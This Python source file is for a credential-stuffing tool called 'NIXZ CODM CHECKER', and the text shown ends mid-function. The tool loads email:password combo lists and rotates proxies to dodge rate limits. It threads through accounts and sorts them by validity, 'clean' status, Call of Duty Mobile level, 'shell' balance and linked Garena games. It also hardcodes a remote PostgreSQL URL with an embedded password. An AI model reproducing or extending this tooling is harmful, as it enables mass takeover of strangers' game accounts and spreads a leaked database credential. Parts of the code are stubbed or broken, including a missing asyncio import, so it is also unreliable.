import hashlib
import json
import logging
import os
import random
import re
import sys
import threading
import time
import urllib.parse
import math
import platform
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

import cloudscraper
import colorama
import requests
from Crypto.Cipher import AES
from rich.console import Console, Group
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align

colorama.init(autoreset=True)
console = Console()

BEIGE = '\033[38;2;210;180;140m'
SOFT_BEIGE = '\033[38;2;190;160;120m'
CREAM = '\033[38;2;245;240;225m'
TAUPE = '\033[38;2;140;120;100m'
SAGE = '\033[38;2;150;170;120m'
WARM_GOLD = '\033[38;2;200;170;90m'
DIM_BEIGE = '\033[38;2;120;100;80m'
RESET = '\033[0m'
SOFT_GREEN = SAGE
SOFT_RED = TAUPE
SOFT_CYAN = BEIGE
SOFT_YELLOW = WARM_GOLD
WHITE = CREAM
DIM = DIM_BEIGE
THEME_PRIMARY = "#D4C4A8"
THEME_SUCCESS = "#96AA7A"
THEME_ERROR = "#8C7A6B"
THEME_WARNING = "#C4A47A"
THEME_DIM = "#A89888"
THEME_BRIGHT = "#F5F0E1"
THEME_BORDER = "grey50"

CODM_REGIONS = {
    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇰🇭'},
    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
    'VN': {'name': 'Vietnam', 'code': '84', 'flag': '🇻🇳'},
    'MM': {'name': 'Myanmar', 'code': '95', 'flag': '🇲🇾'},
    'KH': {'name': 'Cambodia', 'code': '855', 'flag': '🇰🇭'},
    'LA': {'name': 'Laos', 'code': '856', 'flag': '🇱🇦'},
    'BN': {'name': 'Brunei', 'code': '673', 'flag': '🇧🇳'},
}

def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub(r'[^\x00-\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return None, None
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join(ch for ch in line if ch.isprintable() or ch == ':')
    if ':' not in line:
        return None, None
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return None, None
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return None, None
        return account, password
    except:
        return None, None

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    return region_code

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or not str(mobile_no).strip():
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected = None
    for code_key, info in CODM_REGIONS.items():
        code = info['code']
        if mobile_str.startswith(code):
            detected = code
            break
    if detected:
        local = mobile_str[len(detected):]
        if len(local) >= 4:
            masked = '*' * (len(local) - 4) + local[-4:]
            return f"+{detected} {masked}"
        return f"+{detected} {local}"
    else:
        if len(mobile_str) >= 4:
            masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
            return f"+{masked}"
        return mobile_str

def strip_ansi(text):
    return re.sub(r'\x1b\[[0-9;]*m', '', text)

def add_indent(text, spaces=8):
    prefix = " " * spaces
    return "\n".join(prefix + line for line in text.split("\n"))

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def format_size(size_bytes):
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s}{size_name[i]}"

def display_banner():
    def get_prop(prop):
        try:
            return subprocess.check_output(["getprop", prop], text=True, stderr=subprocess.DEVNULL).strip() or "Unknown"
        except:
            return "Unknown"
    try:
        brand = get_prop("ro.product.brand").upper()
        model = get_prop("ro.product.model")
        dev_name = get_prop("ro.product.marketname")
        if dev_name == "Unknown": dev_name = model
        chipset = get_prop("ro.board.platform")
        if chipset == "Unknown": chipset = get_prop("ro.hardware")
        android_ver = get_prop("ro.build.version.release")
        build = get_prop("ro.build.display.id")
    except:
        dev_name = platform.node() or "Unknown"
        brand = "Unknown"
        model = "Unknown"
        chipset = platform.machine() or "Unknown"
        android_ver = platform.release() or "Unknown"
        build = platform.version() or "Unknown"

    ascii_art = """[bold #D4C4A8]⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀[/]"""
    info_table = Table(show_header=False, box=None, padding=(0, 2))
    info_table.add_row("[#D4C4A8]DEVICE NAME:[/]", f"[#96AA7A]{dev_name}[/]")
    info_table.add_row("[#D4C4A8]BRAND:[/]", f"[#96AA7A]{brand}[/]")
    info_table.add_row("[#D4C4A8]MODEL:[/]", f"[#96AA7A]{model}[/]")
    info_table.add_row("[#D4C4A8]CHIPSET:[/]", f"[#96AA7A]{chipset}[/]")
    info_table.add_row("[#D4C4A8]ANDROID VER:[/]", f"[#96AA7A]{android_ver}[/]")
    info_table.add_row("[#D4C4A8]BUILD:[/]", f"[#96AA7A]{build}[/]")
    info_panel = Panel(
        info_table,
        title="[bold #D4C4A8]NIXZ CODM CHECKER[/]\n[bold #C4A47A]DEVELOPED BY @rrielqt[/]",
        title_align="left",
        border_style="grey50",
        expand=False,
        width=75
    )
    console.print("\n")
    console.print(Align.center(ascii_art))
    console.print(Align.center(info_panel))
    console.print("\n")

def ask_config(title, question, options):
    content = f"[#D4C4A8]➤[/] [bold white]{question}[/]\n\n"
    for opt_num, opt_text in options:
        content += f"  [#D4C4A8][ {opt_num} ][/]  [white]{opt_text}[/]\n"
    panel = Panel(
        content.strip('\n'),
        title=f"[bold #C4A47A]{title}[/]",
        title_align="left",
        border_style="grey50",
        expand=False,
        width=75
    )
    console.print(Align.center(panel))
    while True:
        ans = console.input("  [bold #D4C4A8]@Kingz[/] [white]➤[/] ").strip().lower()
        valid_opts = [o[0].lower() for o in options]
        if valid_opts and ans in valid_opts:
            return ans
        console.print("  [#8C7A6B]Invalid choice. Try again.[/]")

class ColoredFormatter(logging.Formatter):
    COLORS = {'DEBUG': BEIGE, 'INFO': SAGE, 'WARNING': WARM_GOLD, 'ERROR': TAUPE, 'CRITICAL': TAUPE}
    RESET = RESET
    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

PROXY_ENABLED = True
PROXY_URL = ""
PROXY_FILE = "proxies.txt"
PROXY_ROTATE_EVERY = 50
DEFAULT_THREADS = 3
SESSION_CHUNK_SIZE = 500
CHECK_OTHER_GAMES = True

THREAD_MODES = {
    '1': 3,   # 01-03 — Negligible
    '2': 7,   # 04-07 — Marginal
    '3': 11,  # 08-11 — Moderate
    '4': 15,  # 12-15 — Significant
    '5': 19,  # 16-19 — Substantial
    '6': 23,  # 20-23 — High
    '7': 27,  # 24-27 — Severe
    '8': 30,  # 28-30 — Critical
}

GAME_FILE_MAP = {
    "CODM": "CODM.txt",
    "FREEFIRE": "FreeFire.txt",
    "FREE FIRE": "FreeFire.txt",
    "ROV": "ROV.txt",
    "DELTA FORCE": "DeltaForce.txt",
    "AOV": "AOV.txt",
    "SPEED DRIFTERS": "SpeedDrifters.txt",
    "BLACK CLOVER M": "BlackCloverM.txt",
    "GARENA UNDAWN": "Undawn.txt",
    "FC ONLINE": "FCOnline.txt",
    "FC ONLINE M": "FCOnlineM.txt",
    "MOONLIGHT BLADE": "MoonlightBlade.txt",
    "FAST THRILL": "FastThrill.txt",
    "THE WORLD OF WAR": "WorldOfWar.txt",
}

GAME_DISPLAY_NAMES = [
    ("CODM", "CODM"),
    ("FREEFIRE", "Free Fire"),
    ("ROV", "ROV"),
    ("DELTA FORCE", "Delta Force"),
    ("AOV", "AOV"),
    ("SPEED DRIFTERS", "Speed Drifters"),
    ("BLACK CLOVER M", "Black Clover M"),
    ("GARENA UNDAWN", "Undawn"),
    ("FC ONLINE", "FC Online"),
    ("FC ONLINE M", "FC Online M"),
    ("MOONLIGHT BLADE", "Moonlight Blade"),
    ("FAST THRILL", "Fast Thrill"),
    ("THE WORLD OF WAR", "World of War"),
]

OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

class ProxyManager:
    def __init__(self, proxy_file=PROXY_FILE, fallback_url=PROXY_URL, rotate_every=PROXY_ROTATE_EVERY, enabled=PROXY_ENABLED):
        self.enabled = enabled
        self.rotate_every = rotate_every
        self._counter = 0
        self._index = 0
        self._lock = threading.Lock()
        self.proxies = []
        self._errors = {}
        self._dead = 0
        self._active_threads = 1
        self._hybrid = False
        self.current_url = None
        if not enabled:
            return
        self.proxies = self._load(proxy_file, fallback_url)
        if self.proxies:
            console.print(
                f"    [bold {THEME_PRIMARY}]Proxies loaded:[/bold {THEME_PRIMARY}] "
                f"[{THEME_SUCCESS}]{len(self.proxies)}[/{THEME_SUCCESS}] "
                f"│ Rotate every [{THEME_WARNING}]{rotate_every}[/{THEME_WARNING}] accounts"
            )

    @staticmethod
    def _normalize(url):
        if not url:
            return url
        try:
            parsed = urllib.parse.urlparse(url)
            if parsed.username is None:
                return url
            safe = "-._~+"
            enc_user = urllib.parse.quote(urllib.parse.unquote(parsed.username), safe=safe)
            enc_pass = urllib.parse.quote(urllib.parse.unquote(parsed.password or ""), safe=safe)
            host = parsed.hostname
            port = f":{parsed.port}" if parsed.port else ""
            new_netloc = f"{enc_user}:{enc_pass}@{host}{port}"
            return parsed._replace(netloc=new_netloc).geturl()
        except:
            return url

    def _load(self, proxy_file, fallback_url):
        proxies = []
        try:
            fp = Path(proxy_file)
            if fp.exists():
                for line in fp.read_text(encoding="utf-8").splitlines():
                    line = line.strip()
                    if line and not line.startswith("#"):
                        proxies.append(self._normalize(line))
        except:
            pass
        if not proxies and fallback_url:
            proxies = [self._normalize(fallback_url)]
        return proxies

    def _url_label(self, url):
        try:
            if not url:
                return "?"
            p = urllib.parse.urlparse(url)
            return f"{p.hostname}:{p.port}"
        except:
            return str(url)

    def get_proxy_dict(self):
        if not self.enabled or not self.proxies:
            return None
        with self._lock:
            if self.proxies:
                url = self.proxies[self._index % len(self.proxies)]
                self.current_url = url
                return {"http": url, "https": url}
            return None

    def get_proxy_dict_for_thread(self, thread_id):
        return self.get_proxy_dict()

    def assign_thread_id(self):
        return threading.get_ident()

    def apply_to_session(self, session, thread_id=0):
        pd = self.get_proxy_dict()
        if pd:
            session.proxies.update(pd)
        return session

    def set_thread_count(self, n):
        self._active_threads = max(1, n)

    def tick(self):
        if not self.enabled or not self.proxies:
            return False
        n_threads = getattr(self, "_active_threads", 1)
        threshold = max(1, self.rotate_every // n_threads)
        with self._lock:
            self._counter += 1
            if self._counter < threshold:
                return False
            self._counter = 0
            self._index = (self._index + 1) % len(self.proxies)
            self._total_rots = getattr(self, "_total_rots", 0) + 1
        return True

    def report_error(self, url):
        if not self.enabled or not url:
            return
        DEAD_THRESHOLD = 3
        with self._lock:
            self._errors[url] = self._errors.get(url, 0) + 1
            if self._errors[url] >= DEAD_THRESHOLD and url in self.proxies:
                self.proxies.remove(url)
                self._errors.pop(url, None)
                self._dead += 1
                if self.proxies:
                    self._index = self._index % len(self.proxies)

    def report_success(self, url):
        if not self.enabled or not url:
            return
        with self._lock:
            if url in self._errors:
                self._errors.pop(url, None)

    def status_line(self):
        if not self.enabled:
            return "[red]✖ Proxy OFF[/red]"
        if not self.proxies:
            return "[red]✖ No proxies loaded[/red]"
        label = self._url_label(self.current_url)
        dead = getattr(self, "_dead", 0)
        dead_str = f"  [red]✖ {dead} removed[/red]" if dead else ""
        return f"[green]✔ Proxy ON[/green]  [dim]{label}[/dim]  [yellow](#{self._index + 1}/{len(self.proxies)})[/yellow]  │  rotate every [cyan]{self.rotate_every}[/cyan] accounts{dead_str}"

proxy_manager = None
_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_changed = threading.Event()
_ip_wait_generation = 0

def get_proxy_dict():
    return proxy_manager.get_proxy_dict() if proxy_manager else None

def apply_proxy_to_session(session, thread_id=0):
    return proxy_manager.apply_to_session(session, thread_id) if proxy_manager else session

def _proxy_active():
    return bool(proxy_manager and proxy_manager.enabled and proxy_manager.proxies)

RAILWAY_DB_URL = "postgresql://postgres:CiIBvyjaJJYLkKCqYgPOONEuGxunMFfX@tramway.proxy.rlwy.net:30778/railway"

def _db_row(indent, label, value, color="cyan", width=69):
    content = f"  [{color}]{label}[/{color}]  [bold bright_white]{value}[/bold bright_white]"
    plain = f"  {label}  {value}"
    pad = width - len(plain)
    console.print(indent + "│" + content + " " * max(0, pad) + "│")

def _db_run(coro):
    return asyncio.run(coro)

def _pg_get_stats():
    return {"total": 0, "latest": None}

def _pg_save_combos(combos: list):
    pass

def _pg_filter_combos(local_combos: list):
    return set()

class DatabaseComparison:
    def __init__(self):
        self.stats = None

    def display_database_stats(self):
        indent = "    "
        _err = None
        with console.status(indent + "[bold bright_cyan]  Connecting to Railway database…[/bold bright_cyan]", spinner="dots"):
            try:
                self.stats = _pg_get_stats()
            except Exception as e:
                _err = str(e)
                self.stats = None
        if not self.stats:
            console.print(indent + "[bold yellow]  ⚠️  Unable to fetch database statistics[/bold yellow]")
            if _err:
                console.print(indent + f"[dim red]  {_err}[/dim red]")
            return
        total = self.stats["total"]
        latest = self.stats["latest"].strftime("%Y-%m-%d %H:%M") if self.stats["latest"] else "N/A"
        console.print("")
        console.print(indent + "[bright_yellow]┌─────────────────────────────────────────────────────────────────────┐[/bright_yellow]")
        console.print(indent + "[bright_yellow]│[/bright_yellow][bold bright_white]                       DATABASE  STATISTICS                          [/bold bright_white][bright_yellow]│[/bright_yellow]")
        console.print(indent + "[bright_yellow]├─────────────────────────────────────────────────────────────────────┤[/bright_yellow]")
        _db_row(indent, "Total Combos Stored :", f"{total:,}", "bright_cyan")
        _db_row(indent, "Last Entry Added    :", latest, "yellow")
        _db_row(indent, "Database Host       :", "Railway PostgreSQL", "magenta")
        _db_row(indent, "Maintained by       :", "@rrielqt", "bright_green")
        console.print(indent + "[bright_yellow]└─────────────────────────────────────────────────────────────────────┘[/bright_yellow]")
        console.print("")

    def compare_and_filter_file(self, file_path):
        indent = "    "
        try:
            if isinstance(file_path, str):
                file_path = Path(file_path)
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                file_content = f.read()
            local_combos = [l.strip() for l in file_content.splitlines() if l.strip() and ':' in l]
            total_local = len(local_combos)
            console.print(indent + "[cyan]┌─────────────────────────────────────────────────────────────────────┐[/cyan]")
            console.print(indent + "[cyan]│[/cyan][bold bright_white]                    SEARCHING DATABASE…                              [/bold bright_white][cyan]│[/cyan]")
            console.print(indent + "[cyan]├─────────────────────────────────────────────────────────────────────┤[/cyan]")
            _db_row(indent, "File              :", file_path.name, "bright_cyan")
            _db_row(indent, "Combos to compare :", f"{total_local:,}", "yellow")
            console.print(indent + "[cyan]└─────────────────────────────────────────────────────────────────────┘[/cyan]")
            console.print("")
            matched_set = None
            _conn_err = None
            with console.status(indent + "[bold bright_cyan]  🔄 Comparing with Railway database…[/bold bright_cyan]", spinner="dots"):
                try:
                    matched_set = _pg_filter_combos(local_combos)
                except Exception as e:
                    _conn_err = str(e)
                    matched_set = None
            if matched_set is None:
                console.print(indent + "[red]┌─────────────────────────────────────────────────────────────────────┐[/red]")
                console.print(indent + "[red]│[/red][bold bright_white]                      CONNECTION  ERROR                              [/bold bright_white][red]│[/red]")
                console.print(indent + "[red]├─────────────────────────────────────────────────────────────────────┤[/red]")
                _db_row(indent, "Error  :", (_conn_err or "Could not reach Railway database")[:60], "red")
                _db_row(indent, "Action :", "Skipping filter — using full file", "yellow")
                console.print(indent + "[red]└─────────────────────────────────────────────────────────────────────┘[/red]")
                console.print("")
                return "SERVER_ERROR"
            non_matched_combos = [c for c in local_combos if c not in matched_set]
            matches = len(local_combos) - len(non_matched_combos)
            non_matches = len(non_matched_combos)
            skip_pct = round((matches / total_local * 100), 1) if total_local else 0
            console.print(indent + "[bright_green]┌─────────────────────────────────────────────────────────────────────┐[/bright_green]")
            console.print(indent + "[bright_green]│[/bright_green][bold bright_white]                      COMPARISON  RESULTS                            [/bold bright_white][bright_green]│[/bright_green]")
            console.print(indent + "[bright_green]├─────────────────────────────────────────────────────────────────────┤[/bright_green]")
            _db_row(indent, "Total Combos Checked  :", f"{total_local:,}", "bright_cyan")
            _db_row(indent, "Already in Database   :", f"{matches:,}  ({skip_pct}% skipped)", "red")
            _db_row(indent, "Fresh / Will Check    :", f"{non_matches:,}", "green")
            console.print(indent + "[bright_green]└─────────────────────────────────────────────────────────────────────┘[/bright_green]")
            console.print("")
            if non_matches == 0:
                console.print(indent + "[bold yellow]  ⚠️  All combos already in database — nothing new to check.[/bold yellow]")
                console.print("")
                return None
            filtered_file_path = file_path.parent / f"{file_path.stem}_filtered{file_path.suffix}"
            with open(filtered_file_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(non_matched_combos))
            console.print(indent + f"[bold green]  ✔ Filtered file saved:[/bold green] [cyan]{filtered_file_path.name}[/cyan]")
            console.print(indent + f"[dim]  {non_matches:,} fresh combos queued for checking.[/dim]")
            console.print("")
            return filtered_file_path, non_matched_combos
        except Exception:
            console.print(indent + "[bold red]  ❌ Error during comparison[/bold red]")
            console.print(indent + "[yellow]  ⚠️  Skipping filter — using full file...[/yellow]")
            console.print("")
            return "SERVER_ERROR"

class AccountFileManager:
    def __init__(self):
        self._file_lock = threading.Lock()
        self.combo_folder = Path("Combo")
        self.combo_folder.mkdir(exist_ok=True)

    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except:
            return False

    def scan_combo_folder(self):
        return list(self.combo_folder.glob("*.txt"))

    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {
                'name': file_path.name,
                'path': str(file_path),
                'size': file_size,
                'size_str': format_size(file_size),
                'account_count': account_count
            }
        except:
            return None

    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f"{account}:{password}\n")
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return len(cleaned_lines), invalid_count
        except:
            return 0, 0

    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f"{file_path.stem}_cleaned.txt"
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except:
            return 0

class AccountFileViewer:
    def __init__(self):
        self.console = Console()

    def display_file_table(self, file_infos):
        table = Table(title=f"[bold {THEME_PRIMARY}]SELECT A COMBO FILE[/]", title_justify="left", box=None, border_style=THEME_BORDER, width=75)
        table.add_column("NO.", justify="center", style=f"bold {THEME_PRIMARY}", width=5)
        table.add_column("FILENAME", style="white")
        table.add_column("SIZE", justify="right", style=THEME_WARNING, width=10)
        table.add_column("LINES", justify="right", style=THEME_SUCCESS, width=10)
        for idx, info in enumerate(file_infos, 1):
            name = info['name']
            if len(name) > 35:
                name = name[:32] + '...'
            table.add_row(f"[ {idx} ]", name, info['size_str'], f"{info['account_count']:,}")
        console.print("\n")
        console.print(Align.center(table))
        console.print("")

    def prompt_file_selection(self, file_infos):
        console.print("  [bold #D4C4A8]Select file number or 'auto' for largest:[/]")
        while True:
            choice = console.input("  [bold #D4C4A8]@Kingz[/] [white]➤[/] ").strip().lower()
            if choice == 'auto':
                largest = max(file_infos, key=lambda x: x['account_count'])
                console.print(f"  [{THEME_SUCCESS}]Auto-selected: {largest['name']}[/]")
                return largest['path']
            try:
                idx = int(choice)
                if 1 <= idx <= len(file_infos):
                    return file_infos[idx - 1]['path']
                console.print(f"  [{THEME_ERROR}]Invalid number.[/]")
            except ValueError:
                console.print(f"  [{THEME_ERROR}]Enter a number or 'auto'.[/]")

    def prompt_clean_file(self):
        console.print("  [dim]Clean file encoding? (y/n) [y]:[/dim]")
        return console.input("  [bold #D4C4A8]@Kingz[/] [white]➤[/] ").strip().lower() != 'n'

    def prompt_remove_duplicates(self):
        console.print("  [dim]Remove duplicates? (y/n):[/dim]")
        return console.input("  [bold #D4C4A8]@Kingz[/] [white]➤[/] ").strip().lower() == 'y'

    def prompt_auto_remove_checked(self):
        console.print("  [dim]Auto-remove checked lines? (y/n) [n]:[/dim]")
        return console.input("  [bold #D4C4A8]@Kingz[/] [white]➤[/] ").strip().lower() == 'y'

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.error_count = 0
        self.highest_clean_level = 0
        self.clean_level_counts = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.not_clean_level_counts = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.highest_nc_level = 0
        self.highest_shell = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        self.game_counts = {k: 0 for k, _ in GAME_DISPLAY_NAMES}

    def set_total(self, total):
        self.total_accounts = total

    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False, codm_level=0, game_connections=None, shell=0):
        with self.lock:
            if is_error:
                self.error_count += 1
            elif valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                    if has_codm and codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                    if has_codm and codm_level > 0:
                        if codm_level <= 100:
                            self.clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.clean_level_counts['201-350'] += 1
                        else:
                            self.clean_level_counts['351-400'] += 1
                else:
                    self.not_clean_count += 1
                    if has_codm and codm_level > 0:
                        if codm_level > self.highest_nc_level:
                            self.highest_nc_level = codm_level
                        if codm_level <= 100:
                            self.not_clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.not_clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.not_clean_level_counts['201-350'] += 1
                        else:
                            self.not_clean_level_counts['351-400'] += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
                try:
                    shell_val = int(shell or 0)
                    if shell_val > self.highest_shell:
                        self.highest_shell = shell_val
                except:
                    pass
                for g in (game_connections or []):
                    gname = g.get("game", "").upper()
                    if gname == "FREE FIRE":
                        gname = "FREEFIRE"
                    if gname in self.game_counts:
                        self.game_counts[gname] += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'error': self.error_count,
                'highest_clean_level': self.highest_clean_level,
                'clean_level_counts': dict(self.clean_level_counts),
                'not_clean_level_counts': dict(self.not_clean_level_counts),
                'game_counts': dict(self.game_counts),
                'highest_shell': self.highest_shell,
            }

    def get_processed_count(self):
        with self.lock:
            return self.valid_count + self.invalid_count + self.error_count

    def display_stats(self):
        stats = self.get_stats()
        processed = self.get_processed_count()
        if processed == 0:
            return ""
        elapsed = time.time() - self.start_time
        rate = processed / elapsed if elapsed > 0 else 0
        remaining = self.total_accounts - processed
        eta = remaining / rate if rate > 0 else 0
        total_checked = stats["valid"] + stats["invalid"]
        pct = (processed / self.total_accounts * 100) if self.total_accounts > 0 else 0
        bar_w = 22
        filled = int(pct / 100 * bar_w)
        prog_bar = f"[bright_cyan]{'█' * filled}[/bright_cyan][dim]{'░' * (bar_w - filled)}[/dim] {pct:.1f}%"
        def mb(count, total, color):
            if total == 0:
                return f"[{color}]0[/{color}]"
            w = 14
            f2 = int((count / total) * w)
            return f"[{color}]{'█'*f2}{'░'*(w-f2)}[/{color}] [dim]{count}[/dim]"
        tbl = Table(show_header=False, box=None, padding=(0, 1))
        tbl.add_column(style="bold cyan", min_width=18, no_wrap=True)
        tbl.add_column(style="bold white", no_wrap=False)
        tbl.add_column(style="dim", min_width=10, no_wrap=True)
        tbl.add_row("Progress", prog_bar, f"{processed}/{self.total_accounts}")
        tbl.add_row("", "", "")
        tbl.add_row("Valid", mb(stats["valid"], total_checked, "green"), str(stats["valid"]))
        tbl.add_row("Invalid", mb(stats["invalid"], total_checked, "red"), str(stats["invalid"]))
        tbl.add_row("Clean", mb(stats["clean"], max(stats["valid"],1), "bright_green"), str(stats["clean"]))
        tbl.add_row("Not Clean", mb(stats["not_clean"], max(stats["valid"],1), "yellow"), str(stats["not_clean"]))
        tbl.add_row("Has CODM", mb(stats["has_codm"], max(stats["valid"],1), "bright_cyan"), str(stats["has_codm"]))
        tbl.add_row("No CODM", mb(stats["no_codm"], max(stats["valid"],1), "magenta"), str(stats["no_codm"]))
        tbl.add_row("Errors", mb(stats["error"], max(processed,1), "red"), str(stats["error"]))
        tbl.add_row("", "", "")
        tbl.add_row("Top Clean Level", f"[bright_cyan]{stats['highest_clean_level']}[/bright_cyan]", "")
        tbl.add_row("Top Not Clean Level", f"[yellow]{self.highest_nc_level}[/yellow]", "")
        hs = stats.get("highest_shell", 0)
        hs_color = "bright_yellow" if hs > 0 else "dim"
        tbl.add_row("Highest Shell", f"[{hs_color}]{hs:,}[/{hs_color}]", "")
        tbl.add_row("Rate", f"{rate:.2f} acc/s", "")
        tbl.add_row("ETA", f"{int(eta // 60)}m {int(eta % 60)}s", "")
        gc = stats.get("game_counts", {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
        if active_games:
            tbl.add_row("", "", "")
